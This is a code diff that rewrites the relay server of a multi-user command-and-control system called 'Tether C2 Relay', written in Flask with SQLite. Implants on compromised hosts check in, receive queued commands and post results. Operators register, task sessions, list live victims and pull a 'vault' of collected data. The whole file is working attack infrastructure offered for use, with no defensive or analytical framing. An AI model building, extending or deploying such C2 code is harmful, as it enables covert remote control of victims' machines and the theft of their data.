@@ -1,118 +1,175 @@
-# relay/relay_server.py (Definitive, with verbose and corrected logging)
+# relay_server.py (Authoritative Multi-User Backend)
 from flask import Flask, request, jsonify
-import time, threading
+import time
+import threading
+from werkzeug.security import generate_password_hash, check_password_hash
+import sqlite3
+import json
+
+# --- Database Class ---
+class DatabaseManager:
+    def __init__(self, db_file="tether_global.db"):
+        self.conn = sqlite3.connect(db_file, check_same_thread=False)
+        self.conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY, password_hash TEXT NOT NULL)")
+        self.conn.execute("CREATE TABLE IF NOT EXISTS sessions (session_id TEXT PRIMARY KEY, owner_username TEXT NOT NULL, metadata TEXT, FOREIGN KEY (owner_username) REFERENCES users(username))")
+        self.conn.execute("CREATE TABLE IF NOT EXISTS vault (session_id TEXT, module_name TEXT, data TEXT, PRIMARY KEY (session_id, module_name))")
+
+    def create_user(self, username, password_hash):
+        try:
+            self.conn.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)", (username, password_hash))
+            self.conn.commit()
+            return True
+        except sqlite3.IntegrityError:
+            return False
+
+    def get_user(self, username):
+        cursor = self.conn.cursor()
+        cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
+        return cursor.fetchone()
+
+    def create_or_update_session(self, session_id, owner_username, metadata):
+        self.conn.execute("INSERT OR REPLACE INTO sessions (session_id, owner_username, metadata) VALUES (?, ?, ?)", (session_id, owner_username, json.dumps(metadata)))
+        self.conn.commit()
+
+    def get_sessions_for_user(self, username):
+        cursor = self.conn.cursor()
+        cursor.execute("SELECT session_id, metadata FROM sessions WHERE owner_username = ?", (username,))
+        return {row[0]: json.loads(row[1]) for row in cursor.fetchall()}
+
+    def save_vault_data(self, session_id, module_name, data):
+        self.conn.execute("INSERT OR REPLACE INTO vault (session_id, module_name, data) VALUES (?, ?, ?)", (session_id, module_name, json.dumps(data)))
+        self.conn.commit()
+
+    def load_vault_data_for_user(self, username):
+        user_sessions = self.get_sessions_for_user(username)
+        vault_data = {}
+        for session_id, metadata in user_sessions.items():
+            vault_data[session_id] = {"metadata": metadata}
+        
+        if not user_sessions:
+            return {}
+            
+        session_ids_placeholder = ','.join('?' for _ in user_sessions)
+        query = f"SELECT session_id, module_name, data FROM vault WHERE session_id IN ({session_ids_placeholder})"
+        
+        for session_id, module_name, data_json in self.conn.execute(query, tuple(user_sessions.keys())):
+            if session_id in vault_data:
+                vault_data[session_id][module_name] = json.loads(data_json)
+        return vault_data
 
 app = Flask(__name__)
 app.config['MAX_CONTENT_LENGTH'] = 32 * 1024 * 1024
+db = DatabaseManager()
 
-# NOTE: These are in-memory stores. If the relay server restarts, all active session
-# data, command queues, and pending responses will be lost. For a production-ready
-# system, this state should be managed in a persistent store like Redis.
-active_sessions = {}
+# --- In-Memory State for Live Interaction ---
 command_queue = {}
 response_queue = {}
+active_sessions = {}
+# Threading Locks
+cmd_lock = threading.Lock()
+res_lock = threading.Lock()
+ses_lock = threading.Lock()
 
-# --- Threading Locks ---
-session_lock = threading.Lock()
-command_lock = threading.Lock()
-response_lock = threading.Lock()
-
-def process_results(session_id, c2_user, results):
-    for result in results:
-        if result.get("command") == "System Info":
-            output = result.get("output", {})
-            if output.get("status") == "success":
-                new_data = output.get("data", {})
-                with session_lock:
-                    if c2_user in active_sessions and session_id in active_sessions[c2_user]:
-                        active_sessions[c2_user][session_id]["metadata"].update(new_data)
-
-@app.route('/implant/hello', methods=['POST'])
-def handle_hello():
-    try:
-        data = request.json
-        session_id = data.get("session_id")
-        c2_user = data.get("c2_user")
-    except: return "error: Invalid JSON", 400
-    if not session_id or not c2_user: return "error: Missing session_id or c2_user", 400
-
-    with session_lock:
-        active_sessions.setdefault(c2_user, {})
-        if session_id not in active_sessions[c2_user]:
-            # FIX: Improved logging to be more descriptive.
-            hostname = data.get("hostname", "Unknown Host")
-            print(f"[RELAY] New session registered from {hostname} for user {c2_user}. (ID: {session_id})")
-            metadata = {
-                "hostname": data.get("hostname", "Resolving..."),
-                "user": data.get("user", "Resolving..."),
-                "os": data.get("os", "Resolving..."),
-                "ip": "Resolving..."
-            }
-            active_sessions[c2_user][session_id] = {"metadata": metadata}
-        active_sessions[c2_user][session_id]['last_seen'] = time.time()
-
-    results = data.get("results", [])
-    if results:
-        process_results(session_id, c2_user, results)
-
-    with command_lock:
-        commands = command_queue.pop(session_id, [])
-
-    return jsonify({"commands": commands})
-
-@app.route('/c2/poll/<c2_user>', methods=['GET'])
-def poll_for_updates(c2_user):
-    live_threshold = time.time() - 40
-
-    live_sessions = {}
-    with session_lock:
-        user_sessions = active_sessions.get(c2_user, {})
-        for sid, data in user_sessions.items():
-            if data.get("last_seen", 0) > live_threshold:
-                live_sessions[sid] = data
-
-    user_responses = []
-    with response_lock:
-        sessions_to_check = list(response_queue.keys())
-        for session_id in sessions_to_check:
-            # Ensure the session belongs to the polling user
-            if session_id in active_sessions.get(c2_user, {}):
-                 user_responses.extend(response_queue.pop(session_id, []))
-
-    # FIX: Improved logging for polling requests.
-    print(f"[RELAY] C2 panel for user '{c2_user}' is polling. Found {len(live_sessions)} live session(s).")
-    return jsonify({
-        "sessions": live_sessions,
-        "responses": user_responses
-    })
-
-@app.route('/c2/task', methods=['POST'])
-def handle_task():
+# --- Authentication Endpoints ---
+@app.route('/auth/register', methods=['POST'])
+def register():
     data = request.json
-    session_id = data.get("session_id")
-    command = data.get("command")
-    if not session_id or not command:
-        return jsonify({"status": "error", "message": "Missing session_id or command"}), 400
-    with command_lock:
-        command_queue.setdefault(session_id, []).append(command)
-    print(f"[RELAY] Command queued for session {session_id}.")
-    return jsonify({"status": "ok", "message": "Command queued."})
+    username, password = data.get('username'), data.get('password')
+    if not all([username, password]) or len(password) < 4:
+        return jsonify({"success": False, "error": "Username and a password (min 4 chars) are required."}), 400
+    if db.create_user(username, generate_password_hash(password)):
+        return jsonify({"success": True, "message": "Account created successfully."})
+    else:
+        return jsonify({"success": False, "error": "Username already exists."}), 409
+
+@app.route('/auth/login', methods=['POST'])
+def login():
+    data = request.json
+    username, password = data.get('username'), data.get('password')
+    user = db.get_user(username)
+    if user and check_password_hash(user[1], password):
+        return jsonify({"success": True, "username": user[0]})
+    else:
+        return jsonify({"success": False, "error": "Invalid username or password."}), 401
+
+# --- Implant Endpoints ---
+@app.route('/implant/hello', methods=['POST'])
+def handle_implant_hello():
+    data = request.json
+    session_id, c2_user = data.get("session_id"), data.get("c2_user")
+    if not all([session_id, c2_user]):
+        return jsonify({"error": "session_id and c2_user are required"}), 400
+    
+    metadata = {
+        "hostname": data.get("hostname"),
+        "user": data.get("user"),
+        "os": data.get("os")
+    }
+    db.create_or_update_session(session_id, c2_user, metadata)
+    
+    with ses_lock:
+        active_sessions[session_id] = {"owner": c2_user, "last_seen": time.time(), "metadata": metadata}
+    
+    if "results" in data:
+        for result in data.get("results", []):
+            if "command" in result and "output" in result:
+                db.save_vault_data(session_id, result["command"], result["output"])
+    
+    with cmd_lock:
+        commands_to_execute = command_queue.get(c2_user, {}).pop(session_id, [])
+        
+    return jsonify({"commands": commands_to_execute})
 
 @app.route('/implant/response', methods=['POST'])
-def handle_response():
+def handle_implant_response():
     data = request.json
     session_id = data.get("session_id")
-    if not session_id:
-        return jsonify({"status": "error", "message": "Missing session_id"}), 400
-    with response_lock:
-        response_queue.setdefault(session_id, []).append(data)
+    with ses_lock:
+        session_info = active_sessions.get(session_id)
+    if session_info:
+        with res_lock:
+            response_queue.setdefault(session_info["owner"], {}).setdefault(session_id, []).append(data)
     return jsonify({"status": "ok"})
 
-@app.route('/ping', methods=['GET'])
-def handle_ping():
-    return "pong", 200
+# --- C2 Controller Endpoints ---
+@app.route('/c2/task', methods=['POST'])
+def handle_c2_task():
+    data = request.json
+    username, session_id, command = data.get("username"), data.get("session_id"), data.get("command")
+    if not all([username, session_id, command]):
+        return jsonify({"status": "error", "message": "Missing username, session_id, or command"}), 400
+    with cmd_lock:
+        command_queue.setdefault(username, {}).setdefault(session_id, []).append(command)
+    return jsonify({"status": "ok"})
 
-# The __main__ block is for local testing; gunicorn will run `app` directly.
+@app.route('/c2/discover', methods=['POST'])
+def discover_sessions():
+    username = request.json.get("username")
+    user_sessions = {}
+    with ses_lock:
+        for sid, data in active_sessions.items():
+            if data["owner"] == username and (time.time() - data["last_seen"]) < 45: # Increased timeout
+                user_sessions[sid] = data["metadata"]
+    return jsonify({"sessions": user_sessions})
+    
+@app.route('/c2/get_responses', methods=['POST'])
+def get_c2_responses():
+    username, session_id = request.json.get("username"), request.json.get("session_id")
+    with res_lock:
+        responses = response_queue.get(username, {}).pop(session_id, [])
+    return jsonify({"responses": responses})
+
+@app.route('/c2/get_all_vault_data', methods=['POST'])
+def get_all_vault_data():
+    username = request.json.get("username")
+    if not username:
+        return jsonify({"success": False, "error": "Username is required"}), 400
+    vault_data = db.load_vault_data_for_user(username)
+    return jsonify({"success": True, "data": vault_data})
+
+@app.route('/')
+def index():
+    return "Tether C2 Relay is operational."
+
 if __name__ == '__main__':
-    print("Starting Flask development server for local testing...")
     app.run(host='0.0.0.0', port=5001)
